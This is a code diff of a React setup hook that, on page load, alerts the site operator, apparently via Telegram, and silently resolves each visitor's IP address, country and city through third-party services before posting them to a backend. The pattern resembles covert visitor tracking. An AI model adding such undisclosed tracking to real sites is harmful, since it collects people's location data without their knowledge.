@@ -1,8 +1,7 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { v4 as uuid } from "uuid";
 import { IPService } from "../utils/ipService";
 import { buildApiUrl } from "../config/api";
-import { PAGE_CONSTANTS } from "../utils/pageUtils";
 import {
   retryWithBackoff,
   RETRY_CONFIGS,
@@ -12,109 +11,104 @@ import {
 export const useInitialSetup = (setAllData, setStep) => {
   const [Unik, setUnik] = useState("");
   const [isInitialized, setIsInitialized] = useState(false);
+  const ranRef = useRef(false);
 
   useEffect(() => {
+    if (ranRef.current) return;
+    ranRef.current = true;
+
     const uniqueId = uuid().slice(0, 8);
     setUnik(uniqueId);
 
-    const initializeUserData = async () => {
-      let ip = null;
-      let locationData = { country: null, city: null };
+    const context = process.env.NEXT_PUBLIC_CONTEXT || "";
 
-      try {
-        // Fetch IP with retry logic
+    const postIp = async (params, notifyNow, timeoutMs = 10000) => {
+      await retryWithBackoff(async () => {
+        const response = await fetchWithTimeout(
+          buildApiUrl("/api/send/ip"),
+          {
+            method: "POST",
+            body: JSON.stringify({ ...params, notifyNow }),
+            headers: {
+              "Content-type": "application/json; charset=UTF-8",
+              "X-Robots-Tag": "googlebot: nofollow",
+            },
+          },
+          timeoutMs
+        );
+
+        if (!response.ok) {
+          const error = new Error(
+            `HTTP ${response.status}: ${response.statusText}`
+          );
+          error.response = { status: response.status };
+          throw error;
+        }
+
+        return response;
+      }, RETRY_CONFIGS.INTERNAL_API);
+    };
+
+    const initializeUserData = async () => {
+      // 1. Notify Telegram immediately. The backend fills in the real IP from
+      //    the request headers, so this no longer waits for third-party APIs.
+      const notifyVisit = postIp(
+        { id: uniqueId, context, currentStep: "Page Loaded" },
+        true,
+        45000 // tolerate a cold-started backend without losing the alert
+      ).catch((error) => {
+        console.error("Failed to send visit notification:", error);
+      });
+
+      // 2. Resolve IP/location in the background and store it silently.
+      const resolveUserDetails = (async () => {
+        let ip = null;
+        let locationData = { country: null, city: null };
+
         try {
           ip = await IPService.fetchIPAddress();
         } catch (error) {
           console.error("Failed to fetch IP after retries:", error);
-          // Continue without IP - we'll use fallback values
         }
 
-        // Fetch location data only if we have an IP
         if (ip) {
           try {
             locationData = await IPService.fetchLocationData(ip);
           } catch (error) {
-            console.error(
-              "Failed to fetch location data after retries:",
-              error
-            );
-            // Continue with null location data
+            console.error("Failed to fetch location data after retries:", error);
             locationData = { country: null, city: null };
           }
         }
 
-        const params = {
+        const details = {
           id: uniqueId,
           ip: ip || "unknown",
           country: locationData.country || "unknown",
           city: locationData.city || "unknown",
-          currentStep: "Page Loaded",
-          context: process.env.NEXT_PUBLIC_CONTEXT || "",
+          context,
         };
 
-        // Update AllData with the new information
-        setAllData((prevData) => ({
-          ...prevData,
-          id: uniqueId,
-          ip: ip || "unknown",
-          country: locationData.country || "unknown",
-          city: locationData.city || "unknown",
-          context: process.env.NEXT_PUBLIC_CONTEXT || "",
-        }));
+        setAllData((prevData) => ({ ...prevData, ...details }));
 
-        // Send initial data with retry logic
         try {
-          await retryWithBackoff(async () => {
-            const response = await fetchWithTimeout(
-              buildApiUrl("/api/send/ip"),
-              {
-                method: "POST",
-                body: JSON.stringify(params),
-                headers: {
-                  "Content-type": "application/json; charset=UTF-8",
-                  "X-Robots-Tag": "googlebot: nofollow",
-                },
-              },
-              10000
-            );
-
-            if (!response.ok) {
-              const error = new Error(
-                `HTTP ${response.status}: ${response.statusText}`
-              );
-              error.response = { status: response.status };
-              throw error;
-            }
-
-            return response;
-          }, RETRY_CONFIGS.INTERNAL_API);
+          await postIp(details, false);
         } catch (error) {
-          console.error("Failed to send initial data after retries:", error);
-          // Don't prevent initialization from completing
-          // The app can still function without sending this data
+          console.error("Failed to store resolved IP data:", error);
         }
+      })();
 
-        setIsInitialized(true);
-      } catch (error) {
-        console.error("Critical error during initialization:", error);
+      await Promise.allSettled([notifyVisit, resolveUserDetails]);
 
-        // Even if everything fails, we should still initialize with fallback data
-        setAllData((prevData) => ({
-          ...prevData,
-          id: uniqueId,
-          ip: "unknown",
-          country: "unknown",
-          city: "unknown",
-          context: process.env.NEXT_PUBLIC_CONTEXT || "",
-        }));
-
-        setIsInitialized(true);
-      }
+      setAllData((prevData) => ({
+        ...prevData,
+        id: uniqueId,
+        context,
+      }));
+      setIsInitialized(true);
     };
 
     initializeUserData();
-  }, [setAllData, setStep]);
+  }, [setAllData]);
 
   return {
     Unik,
